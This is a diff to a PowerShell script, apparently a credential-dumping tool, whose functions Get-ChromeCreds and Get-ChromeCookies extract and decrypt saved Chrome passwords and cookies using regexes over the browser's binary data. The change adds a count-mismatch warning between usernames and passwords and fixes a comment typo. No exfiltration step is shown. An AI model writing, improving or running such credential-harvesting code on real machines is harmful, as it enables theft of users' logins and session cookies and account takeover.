@@ -34,7 +34,8 @@ function Get-ChromeCreds() {
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
 	$PwdNum = 0
 	$DecPwdArray = @()
-
+	$PwdMatchCount = $PwdMatches.Count
+	
 	# Decrypt the password macthes and put them in an array
 	Foreach ($Pwd in $PwdMatches) {
 		$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
@@ -48,7 +49,16 @@ function Get-ChromeCreds() {
 	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]\x08)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
 	$UserMatches = $UserRegex.Matches($BinaryText)
 	$UserNum = 0
+	$UserMatchCount = $UserMatches.Count
 	$UserArray = @()
+	
+	# Check to see if number of users matches the number of passwords. If the values are different, very likely that there was a regex mismatch.
+	# All returned values should be treated with caution if this error is presented. May be out of order.
+	
+	if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { 
+	$Mismatch = [string]"The number of users is different than the number of passwords! This is most likely due to a regex mismatch."
+	Write-Error $Mismatch
+	}
 	
 	# Put the URL/User matches into an array
 	Foreach ($User in $UserMatches) {
@@ -138,7 +148,7 @@ function Get-ChromeCookies() {
 	$CookieMatches = $CookieRegex.Matches($BinaryText)
 	$CookieMatchCount = $CookieMatches.Count
 
-	# Check to see if number cookies matches the number of encrypted blobs. If the values are different, very likely that there was a regex mismatch.
+	# Check to see if number of cookies matches the number of encrypted blobs. If the values are different, very likely that there was a regex mismatch.
 	# All returned values should be treated with caution if this error is presented. May be out of order.
 	
 	if (-NOT ($CookieMatchCount -eq $BlobMatchCount)) { 
